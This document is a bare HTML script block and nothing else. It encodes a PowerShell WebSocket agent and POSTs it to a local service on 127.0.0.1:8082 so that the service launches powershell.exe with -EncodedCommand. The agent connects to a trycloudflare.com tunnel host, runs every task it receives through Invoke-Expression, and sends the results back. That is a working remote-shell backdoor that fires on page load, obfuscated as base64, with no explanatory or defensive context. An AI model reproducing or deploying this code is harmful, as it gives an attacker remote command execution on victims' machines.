<script>
function toBase64Utf16LE(str) {
    const bytes = new Uint8Array(str.length * 2);
    for (let i = 0; i < str.length; i++) {
        const c = str.charCodeAt(i);
        bytes[i * 2]     = c & 0xff;
        bytes[i * 2 + 1] = (c >> 8) & 0xff;
    }
    let binary = "";
    for (const b of bytes) {
        binary += String.fromCharCode(b);
    }
    return btoa(binary);
}
const command1 = "$uri = [Uri]\"wss://remains-hon-doe-contributions.trycloudflare.com/ws/agent\"\n$ws = [System.Net.WebSockets.ClientWebSocket]::new()\n\ntry {\n    $ws.ConnectAsync(\n        $uri,\n        [Threading.CancellationToken]::None\n    ).GetAwaiter().GetResult()\n\n    Write-Host \"Connected\"\n\n    $buffer = New-Object byte[] 4096\n\n    while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {\n        $segment = [ArraySegment[byte]]::new($buffer)\n\n        $received = $ws.ReceiveAsync(\n            $segment,\n            [Threading.CancellationToken]::None\n        ).GetAwaiter().GetResult()\n\n        if ($received.MessageType -eq\n            [System.Net.WebSockets.WebSocketMessageType]::Close) {\n            break\n        }\n\n        $json = [Text.Encoding]::UTF8.GetString(\n            $buffer, 0, $received.Count\n        )\n        $message = $json | ConvertFrom-Json\n        $result = Invoke-Expression $message.task | Out-String\n        if ($message.task -eq \"hostname\" -or 1 -eq 1) {\n            $reply = @{\n                task   = \"hostname\"\n                result = $result.Trim()\n            } | ConvertTo-Json -Compress\n            #Write-Host $result\n            $bytes = [Text.Encoding]::UTF8.GetBytes($reply)\n            $segmentOut = [ArraySegment[byte]]::new($bytes)\n\n            $ws.SendAsync(\n                $segmentOut,\n                [System.Net.WebSockets.WebSocketMessageType]::Text,\n                $true,\n                [Threading.CancellationToken]::None\n            ).GetAwaiter().GetResult()\n        }\n    }\n}\nfinally {\n    $ws.Dispose()\n}";
const command = `${command1} ; pause`
const encoded = toBase64Utf16LE(command);
const url =
    'http://127.0.0.1:8082/api/Client/StartProcessWithArguments/' +
    'powershell.exe/' +
    encodeURIComponent('-EncodedCommand ' + encoded);
fetch(url, {
    method: 'POST'
})
.then(r => console.log('HTTP:', r.status))
.catch(e => console.error('FETCH ERROR:', e));
</script>
